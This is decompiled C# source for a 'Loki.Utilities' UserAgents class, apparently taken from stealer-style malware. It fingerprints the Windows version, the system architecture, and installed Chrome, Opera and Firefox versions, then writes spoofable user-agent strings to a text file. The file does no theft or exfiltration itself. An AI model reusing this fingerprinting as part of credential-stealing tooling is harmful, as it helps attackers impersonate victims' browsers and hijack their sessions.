using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using loki;
using Microsoft.Win32;

namespace Loki.Utilities
{
	// Token: 0x02000003 RID: 3
	internal class UserAgents
	{
		// Token: 0x17000001 RID: 1
		// (get) Token: 0x0600000D RID: 13 RVA: 0x00003432 File Offset: 0x00001632
		// (set) Token: 0x0600000E RID: 14 RVA: 0x00003439 File Offset: 0x00001639
		public static string NT { get; set; }

		// Token: 0x0600000F RID: 15 RVA: 0x00003444 File Offset: 0x00001644
		private static ManagementObject GetNTVersion(string className)
		{
			using (ManagementClass managementClass = new ManagementClass(className))
			{
				foreach (ManagementBaseObject managementBaseObject in managementClass.GetInstances())
				{
					using (ManagementObject managementObject = (ManagementObject)managementBaseObject)
					{
						if (managementObject != null)
						{
							return managementObject;
						}
					}
				}
			}
			return null;
		}

		// Token: 0x06000010 RID: 16 RVA: 0x000034D0 File Offset: 0x000016D0
		private static string GetOsVer()
		{
			string result;
			try
			{
				using (ManagementObject ntversion = UserAgents.GetNTVersion("Win32_OperatingSystem"))
				{
					result = ((ntversion != null) ? (ntversion["Version"] as string) : string.Empty);
				}
			}
			catch (Exception)
			{
				result = string.Empty;
			}
			return result;
		}

		// Token: 0x06000011 RID: 17 RVA: 0x00003538 File Offset: 0x00001738
		public static string GetNTVersion()
		{
			string result;
			try
			{
				result = UserAgents.GetOsVer();
			}
			catch (Exception)
			{
				result = string.Empty;
			}
			return result;
		}

		// Token: 0x06000012 RID: 18 RVA: 0x00003568 File Offset: 0x00001768
		public static void Get_agent(string dir)
		{
			UserAgents.GetOSBit();
			UserAgents.NT = UserAgents.GetNTVersion();
			string[] array = UserAgents.NT.Split(new char[]
			{
				'.'
			});
			string text = string.Empty;
			if (array.Contains("10"))
			{
				text = "Windows NT 10.0";
			}
			if (array.Length > 1 && !array.Contains("10"))
			{
				text = "Windows NT " + array[0] + "." + array[1];
			}
			try
			{
				using (StreamWriter streamWriter = new StreamWriter(dir + "\\UserAgents.txt"))
				{
					if (Directory.Exists(Environment.GetEnvironmentVariable("LocalAppData") + "\\Google\\Chrome\\User Data"))
					{
						object value = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", "", null);
						string fileVersion;
						if (value != null)
						{
							fileVersion = FileVersionInfo.GetVersionInfo(value.ToString()).FileVersion;
						}
						else
						{
							value = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", "", null);
							fileVersion = FileVersionInfo.GetVersionInfo(value.ToString()).FileVersion;
						}
						if (UserAgents.razr == "x64")
						{
							streamWriter.WriteLine(string.Concat(new string[]
							{
								"Mozilla/5.0 (",
								text,
								"; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/",
								fileVersion,
								" Safari/537.36"
							}));
						}
						else
						{
							streamWriter.WriteLine(string.Concat(new string[]
							{
								"Mozilla/5.0 (",
								text,
								") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/",
								fileVersion,
								" Safari/537.36"
							}));
						}
					}
					if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Web Data"))
					{
						try
						{
							string text2 = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Classes\\Applications\\opera.exe\\shell\\open\\command", "", null).ToString();
							string fileVersion = FileVersionInfo.GetVersionInfo(text2.Remove(text2.Length - 6, 6).Remove(0, 1)).FileVersion;
							string text3 = string.Empty;
							string empty = string.Empty;
							if (fileVersion.Split(new char[]
							{
								'.'
							}).First<string>().Equals("54"))
							{
								text3 = "67.0.3396.87";
							}
							if (fileVersion.Split(new char[]
							{
								'.'
							}).First<string>().Equals("55"))
							{
								text3 = "68.0.3440.106";
							}
							if (fileVersion.Split(new char[]
							{
								'.'
							}).First<string>().Equals("56"))
							{
								text3 = "69.0.3497.100";
							}
							if (fileVersion.Split(new char[]
							{
								'.'
							}).First<string>().Equals("57"))
							{
								text3 = "70.0.3538.102";
							}
							if (UserAgents.razr == "x64")
							{
								streamWriter.WriteLine(string.Concat(new string[]
								{
									"Mozilla/5.0 (",
									text,
									"; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/",
									text3,
									" Safari/537.36 OPR/55.0.2994.44"
								}));
							}
							else
							{
								streamWriter.WriteLine(string.Concat(new string[]
								{
									"Mozilla/5.0 (",
									text,
									") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/",
									text3,
									" Safari/537.36 OPR/55.0.2994.44"
								}));
							}
						}
						catch (Exception)
						{
						}
					}
					if (File.Exists("C:\\Program Files\\Mozilla Firefox\\firefox.exe"))
					{
						object value2 = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\firefox.exe", "", null);
						string fileVersion;
						if (value2 != null)
						{
							fileVersion = FileVersionInfo.GetVersionInfo(value2.ToString()).FileVersion;
						}
						else
						{
							value2 = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\firefox.exe", "", null);
							fileVersion = FileVersionInfo.GetVersionInfo(value2.ToString()).FileVersion;
						}
						string text4 = string.Empty;
						text4 = fileVersion.Split(new char[]
						{
							'.'
						}).First<string>() + "." + fileVersion.Split(new char[]
						{
							'.'
						})[1];
						if (UserAgents.razr == "x64")
						{
							streamWriter.WriteLine(string.Concat(new string[]
							{
								"Mozilla/5.0 (",
								text,
								"; Win64; x64; rv:",
								text4,
								") Gecko/20100101 Firefox/",
								text4
							}));
						}
						else
						{
							streamWriter.WriteLine(string.Concat(new string[]
							{
								"Mozilla/5.0 (",
								text,
								"; rv:",
								text4,
								") Gecko/20100101 Firefox/",
								text4
							}));
						}
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000013 RID: 19 RVA: 0x000039C4 File Offset: 0x00001BC4
		public static string GetOSBit()
		{
			if (UserAgents.Is64Bit())
			{
				UserAgents.razr = "x64";
				return "x64";
			}
			UserAgents.razr = "x32";
			return "x32";
		}

		// Token: 0x06000014 RID: 20 RVA: 0x000039EC File Offset: 0x00001BEC
		public static bool Is64Bit()
		{
			bool result;
			NativeMethods.IsWow64Process(Process.GetCurrentProcess().Handle, out result);
			return result;
		}

		// Token: 0x04000008 RID: 8
		public static string razr;
	}
}
